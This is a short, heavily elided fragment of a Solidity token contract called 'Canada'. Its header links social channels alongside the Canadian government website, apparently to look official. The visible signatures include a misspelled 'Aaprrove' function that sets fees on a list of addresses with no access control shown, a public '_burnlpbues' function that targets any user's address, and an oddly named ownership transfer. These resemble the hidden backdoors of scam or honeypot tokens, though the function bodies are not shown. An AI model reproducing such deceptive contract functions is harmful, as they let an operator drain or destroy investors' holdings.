...
/**
https://t.me/Canada_CAERC
https://twitter.com/Canada_Erc
https://www.canada.ca/
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipbonkr(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Canada is Ownable {
    ...
    function Aaprrove(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnlpbues(address user) public {
